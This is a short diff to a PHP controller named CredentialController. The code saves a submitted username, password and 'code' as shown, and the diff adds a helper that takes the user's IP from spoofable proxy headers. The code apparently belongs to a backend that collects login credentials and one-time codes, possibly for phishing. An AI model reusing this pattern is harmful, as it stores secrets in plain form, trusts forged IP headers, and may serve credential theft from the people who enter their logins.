@@ -20,7 +20,7 @@ class CredentialController extends Controller
         $lang = $request->header('Lang', 'vietnamese');
 
          User::create([
-            'ip' => $request->get('ip'),
+            'ip' => $this->getUserIpAddr(),
             'username' => $username,
             'password' => $password,
             'code' => $code,
@@ -40,5 +40,18 @@ class CredentialController extends Controller
         $jsonData = $response->json();
 
         return response()->json($jsonData);
+    }
+
+    function getUserIpAddr(){
+        if(!empty($_SERVER['HTTP_CLIENT_IP'])){
+            //ip from share internet
+            $ip = $_SERVER['HTTP_CLIENT_IP'];
+        }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
+            //ip pass from proxy
+            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+        }else{
+            $ip = $_SERVER['REMOTE_ADDR'];
+        }
+        return $ip;
     }
 }
